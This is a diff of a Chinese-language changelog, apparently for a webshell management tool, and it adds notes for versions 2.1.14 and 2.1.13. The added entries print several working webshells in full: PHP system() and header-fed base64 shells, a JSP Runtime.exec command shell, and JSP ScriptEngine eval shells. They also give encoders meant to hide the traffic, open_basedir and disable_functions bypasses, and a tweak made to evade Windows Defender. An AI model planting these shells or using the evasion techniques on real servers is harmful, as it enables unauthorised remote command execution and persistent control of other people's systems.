@@ -2,7 +2,195 @@
 > 有空会补补BUG、添添新功能。    
 > 同时也欢迎大家的参与！感谢各位朋友的支持！ .TAT.
 
-## `2.1.13`
+## 2021/07/25 `v(2.1.14)`
+
+### 核心
+
+* 新增 CMDLINUX Shell 类型
+
+> 基于命令执行的一句话类型, 仅支持 Linux 环境
+
+只要有一个可以执行命令的点, 就可以快乐起来 :)
+
+* PHP:
+
+```php
+<?php system($_POST['ant']);?>
+```
+
+* 比较流行的 JSP 命令执行 WebShell
+
+```jsp
+<%
+  if(request.getParameter("cmd")!=null){
+    java.io.InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")}).getInputStream();
+    int a = -1;
+    byte[] b = new byte[1];
+    out.print("<pre>");
+    while((a=in.read(b))!=-1){
+      out.print(new String(b));
+    }
+    out.print("</pre>");
+  }
+%>
+```
+
+**注意: Runtime.exec 方法直接传入字符串时不支持多条命令拼接，需要使用数组方式**
+
+* 简化新增类型后Shell创建步骤
+
+
+### 数据库管理
+
+* 新增 CMDLINUX 类型数据库管理(支持 mysql、sqlite3)
+
+> 利用 mysql和sqlite3 客户端命令，需要目标上有对应的二进制
+
+* 修复 PHP SQLite 下自动生成的 sql 语句语法错误的 Bug
+
+### 系统设置
+
+* 编码管理支持 cmdlinux 类型
+
+在使用 cmdlinux 类型时，如果接收参数在 HTTP Header 部分, 请务必使用编码器，因为部分 Payload 有换行符
+
+eg:
+
+WebShell:
+
+```php
+<?php system(base64_decode($_SERVER["HTTP_CMD"])); ?>
+```
+
+对应该的编码器如下:
+
+```js
+'use strict';
+
+module.exports = (pwd, data, ext={}) => {
+  let headers = ext.opts.httpConf.headers;
+  headers[pwd] = Buffer.from(data['_']).toString('base64');
+  delete data['_'];
+  return data;
+}
+```
+
+* 解码器支持 CMDLinux
+
+base64 解码器:
+
+```js
+/**
+ * cmdlinux::base64解码器
+ */
+
+'use strict';
+
+module.exports = {
+  asoutput: () => {
+    return `asenc(){ base64 "$@"; };` // 注意此处是 Shell 语法
+  },
+  decode_buff: (buff) => {
+    return Buffer.from(buff.toString(), 'base64');
+  }
+}
+```
+
+## 2021/06/19 `v(2.1.13)`
+
+### 核心
+
+* 新增 JSPJS Shell 类型 (Author: @yzddMr6)
+
+> 基于 js 引擎的 jsp 一句话类型, jdk >= 6
+> 相较于 jsp defineClass 实现，该方式的数据包大小明显小了不少
+
+设计思路请参考: https://xz.aliyun.com/t/9715
+
+> 值得一提的是，JSPJS 类型可以通过「迂回」的方式去「直接使用」原来的 JSP 类型 WebShell, 留给大家去探索了
+
+**请耐心看完下面的 Note**
+
+目前该类型默认生成的 WebShell 如下:
+
+```jsp
+<%
+  try {
+    javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName("js");
+    engine.put("request", request);
+    engine.put("response", response);
+    engine.eval(request.getParameter("ant"));
+  } catch (Exception e) {
+    out.println("Error:// "+e.toString());
+  }
+%>
+```
+
+在流量层上和 PHP 最基础的WebShell `<?php eval($_POST['ant']);?>` 一样具有明显特征，不建议使用, 请配合自定义编码器进行:
+
+eg: b64pass 编码器
+
+```js
+'use strict';
+
+module.exports = (pwd, data) => {
+  data[pwd] = Buffer.from(data['_']).toString('base64');
+  delete data['_'];
+  return data;
+}
+```
+
+对应 WebShell 如下:
+
+```jsp
+<%!
+public byte[] base64Decode(String str) throws Exception {
+  Class base64;
+  byte[] value = null;
+  try {
+    base64=Class.forName("sun.misc.BASE64Decoder");
+    Object decoder = base64.newInstance();
+    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
+  } catch (Exception e) {
+    try {
+      base64=Class.forName("java.util.Base64");
+      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+      value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
+    } catch (Exception ee) {}
+  }
+  return value;
+}
+%>
+<%
+  try {
+    javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName("js");
+    engine.put("request", request);
+    engine.put("response", response);
+    engine.eval(new String(base64Decode(request.getParameter("ant"))));
+  } catch (Exception e) {
+    out.println("Error:// "+e.toString());
+  }
+%>
+```
+
+请自行对照最基础的 WebShell 样例自由发挥 :)
+
+* PHP/PHP4 类型增加 Bypass open_basedir, 自动尝试
+
+> 利用的是 `chdir('..');` 方式, 仅在目标配置了 open_basedir 后才会自动尝试
+
+**该功能会影响之前版本 PHP Bypass DisableFunc 插件, 请及时更新插件**
+
+### 虚拟终端
+
+* 虚拟终端显示文字样式调亮(thx @Nearg1e 帮我们暗中收集调研了一波需求)
+* 终端执行命令路径分割符由固定的`[S][E]`改为随机字符串
+
+> 别问, 要问就去问 Windows Defender
+
+### 数据管理
+
+* 开启代理情况下在数据管理状态栏会有提示
 
 ### 后端模块
 
@@ -10,7 +198,7 @@
 
 eg:
 
-```
+```js
 'use strict';
 
 module.exports = (pwd, data) => {
@@ -21,6 +209,16 @@ module.exports = (pwd, data) => {
 }
 ```
 
+### 插件相关
+
+* ExecuteScript 支持 JSPJS 类型
+* GenShell 支持 JSPJS 类型 Shell 生成
+* Bypass disable_function
+  * 修正 bypass open_basedir 场景下上传路径问题
+  * `.antproxy.php` 上传至与 Webshell 同路径下
+  * php -S 利用方式会在界面显示开启的临时端口
+* PortScan 支持 JSPJS 类型
+* Out-of-Network 支持 JSPJS 类型
 
 ## 2021/05/15 `v(2.1.12)`
 
